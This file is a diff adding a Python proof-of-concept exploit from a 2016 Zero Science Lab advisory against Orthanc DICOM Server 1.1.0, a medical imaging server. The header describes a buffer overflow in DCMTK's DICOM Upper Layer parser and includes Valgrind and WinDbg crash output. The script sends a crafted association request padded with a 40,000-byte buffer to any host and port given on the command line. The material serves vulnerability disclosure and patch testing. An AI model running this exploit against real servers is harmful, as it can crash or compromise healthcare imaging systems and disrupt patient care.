@@ -1,0 +1,130 @@
+#!/usr/bin/env python
+# -*- coding: utf8 -*-
+#
+# Orthanc DICOM Server 1.1.0 Remote Memory Corruption Vulnerability
+#
+#
+# Vendor: Sébastien Jodogne
+# Product web page: http://www.orthanc-server.com
+# Affected version: 1.1.0 
+#
+# Summary: Orthanc is a Belgian, open-source, lightweight RESTful DICOM server
+# for healthcare and medical research with an ubiquitous web interface that
+# enables you to upload, receive and transfer DICOM images. It comes with
+# a REST API to automate imaging flows and an SDK to integrate with native
+# applications.
+#
+# Desc: The vulnerability is caused due to the usage of vulnerable collection
+# of libraries that are part of DCMTK Toolkit, specifically the parser for the
+# DICOM Upper Layer Protocol or DUL. Stack/Heap Buffer overflow/underflow can be
+# triggered when sending and processing wrong length of ACSE data structure received
+# over the network by the DICOM Store-SCP service. An attacker can overflow the stack
+# and the heap of the process when sending large array of bytes to the presentation
+# context item length segment of the DICOM standard, potentially resulting in remote
+# code execution and/or denial of service scenario.
+#
+# -------------------------------------------------------------------------------
+#
+# ==5299== Memcheck, a memory error detector
+# ==5299== Copyright (C) 2002-2013, and GNU GPL'd, by Julian Seward et al.
+# ==5299== Using Valgrind-3.10.1 and LibVEX; rerun with -h for copyright info
+# ==5299== Command: ./Orthanc
+# ==5299== 
+# W1201 17:35:34.724792 main.cpp:1235] Orthanc version: mainline (20161129T150442)
+# W1201 17:35:34.804810 main.cpp:1092] Performance warning: Non-release build, runtime debug assertions are turned on
+# W1201 17:35:35.042122 OrthancInitialization.cpp:125] Reading the configuration from: "/home/lqwrm/Subversion/orthanc/Resources/Configuration.json"
+# W1201 17:35:35.272799 FromDcmtkBridge.cpp:141] Loading the external DICOM dictionary "/usr/share/libdcmtk2/dicom.dic"
+# W1201 17:35:35.905845 FromDcmtkBridge.cpp:141] Loading the external DICOM dictionary "/usr/share/libdcmtk2/private.dic"
+# W1201 17:35:36.407249 OrthancInitialization.cpp:488] Registering JPEG Lossless codecs
+# W1201 17:35:36.417571 OrthancInitialization.cpp:493] Registering JPEG codecs
+# W1201 17:35:36.846619 OrthancInitialization.cpp:986] SQLite index directory: "/ssd/lqwrm/Subversion/orthanc/i/OrthancStorage"
+# W1201 17:35:36.999809 OrthancInitialization.cpp:1056] Storage directory: "/ssd/lqwrm/Subversion/orthanc/i/OrthancStorage"
+# W1201 17:35:38.247567 LuaContext.cpp:103] Lua says: Lua toolbox installed
+# W1201 17:35:38.319095 ServerScheduler.cpp:134] The server scheduler has started
+# W1201 17:35:38.332937 HttpClient.cpp:680] No certificates are provided to validate peers, set "HttpsCACertificates" if you need to do HTTPS requests
+# W1201 17:35:38.345479 ServerContext.cpp:181] Disk compression is disabled
+# W1201 17:35:38.358374 ServerIndex.cpp:1392] No limit on the number of stored patients
+# W1201 17:35:38.361704 ServerIndex.cpp:1409] No limit on the size of the storage area
+# W1201 17:35:38.688634 main.cpp:822] DICOM server listening with AET ORTHANC on port: 4242
+# W1201 17:35:38.715241 MongooseServer.cpp:887] This version of OpenSSL is vulnerable to the Heartbleed exploit
+# W1201 17:35:38.721902 MongooseServer.cpp:1027] HTTP compression is enabled
+# W1201 17:35:38.887721 main.cpp:757] HTTP server listening on port: 8042
+# W1201 17:35:38.890026 main.cpp:644] Orthanc has started
+# ==5299== Thread 11:
+# ==5299== Invalid read of size 1
+# ==5299==    at 0x5ECEBD: parsePresentationContext(unsigned char, dul_presentationcontext*, unsigned char*, unsigned long*, unsigned long) (dulparse.cc:389)
+# ==5299==    by 0x5EC6A0: parseAssociate(unsigned char*, unsigned long, dul_associatepdu*) (dulparse.cc:234)
+# ==5299==    by 0x5E0131: AE_6_ExamineAssociateRequest(PRIVATE_NETWORKKEY**, PRIVATE_ASSOCIATIONKEY**, int, void*) (dulfsm.cc:1158)
+# ==5299==    by 0x5DF125: PRV_StateMachine(PRIVATE_NETWORKKEY**, PRIVATE_ASSOCIATIONKEY**, int, int, void*) (dulfsm.cc:750)
+# ==5299==    by 0x56DF26: DUL_ReceiveAssociationRQ(void**, DUL_BLOCKOPTIONS, int, DUL_ASSOCIATESERVICEPARAMETERS*, void**, int) (dul.cc:669)
+# ==5299==    by 0x56B440: ASC_receiveAssociation(T_ASC_Network*, T_ASC_Association**, long, void**, unsigned long*, bool, DUL_BLOCKOPTIONS, int) (assoc.cc:1752)
+# ==5299==    by 0x4494B5: Orthanc::Internals::AcceptAssociation(Orthanc::DicomServer const&, T_ASC_Network*) (CommandDispatcher.cpp:439)
+# ==5299==    by 0x42D010: Orthanc::DicomServer::ServerThread(Orthanc::DicomServer*) (DicomServer.cpp:69)
+# ==5299==    by 0x43198B: void boost::_bi::list1<boost::_bi::value<Orthanc::DicomServer*> >::operator()<void (*)(Orthanc::DicomServer*), boost::_bi::list0>(boost::_bi::type<void>, void (*&)
+#
+# -------------------------------------------------------------------------------
+#
+# (47fc.40cc): Access violation - code c0000005 (first chance)
+# First chance exceptions are reported before any exception handling.
+# This exception may be expected and handled.
+# *** WARNING: Unable to verify checksum for C:\Users\lqwrm\Downloads\orthancAndPluginsWin32.stable\Orthanc.exe
+# *** ERROR: Module load completed but symbols could not be loaded for C:\Users\lqwrm\Downloads\orthancAndPluginsWin32.stable\Orthanc.exe
+# eax=000000ce ebx=ffffc99c ecx=0074ae50 edx=013e3060 esi=018cf094 edi=010090ab
+# eip=0136c910 esp=0389eca8 ebp=0389ece8 iopl=0         nv up ei ng nz na pe nc
+# cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010286
+# Orthanc+0xfc910:
+# 0136c910 8a07            mov     al,byte ptr [edi]          ds:002b:010090ab=??
+#
+# -------------------------------------------------------------------------------
+#
+# Tested on: Microsoft Windows 7 Professional SP1 (EN)
+#            Microsoft Windows 7 Ultimate SP1 (EN)
+#            Ubuntu Linux/14.04.5
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2016-5380
+# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5380.php
+#
+# Vendor: https://bitbucket.org/sjodogne/orthanc/commits/6ac6193a7935865db07d3d81c627c84de7557ce0?at=default
+#         https://bitbucket.org/sjodogne/orthanc/src/Orthanc-1.2.0/NEWS?fileviewer=file-view-default
+# 
+# OFFIS e.V.: https://github.com/commontk/DCMTK/commit/1b6bb76
+#
+#
+# 22.11.2016
+#
+
+
+import socket, sys
+
+hello = ('\x01\x00\x00\x00\x80\x71\x00\x01\x00\x00\x4f\x52\x54\x48'
+         '\x41\x4e\x43\x20\x20\x20\x20\x20\x20\x20\x20\x20\x4a\x4f'
+         '\x58\x59\x50\x4f\x58\x59\x21\x00\x00\x00\x00\x00\x00\x00'
+         '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+         '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+         '\x00\x00\x00\x00\x10\x00\x00\x15\x31\x2e\x32\x2e\x38\x34'
+         '\x30\x2e\x31\x30\x30\x30\x38\x2e\x33\x2e\x31\x2e\x31\x2e'
+         '\x31\x20\x00\x80\x00')
+
+bye = ('\x50\x00\x00\x0c\x51\x00\x00\x04\x00\x00\x07\xde'
+       '\x52\x00\x00\x00')
+
+buffer = '\x41\x42\x43\x44' * 10000
+
+if len(sys.argv) < 3:
+	print '\nUsage: ' +sys.argv[0]+ ' <target> <port>'
+	print 'Example: ' +sys.argv[0]+ ' 172.19.0.214 4242\n'
+	sys.exit(0)
+ 
+host = sys.argv[1]
+port = int(sys.argv[2])
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connect = s.connect((host, port))
+s.settimeout(251)
+s.send(hello+buffer+bye)
+s.close
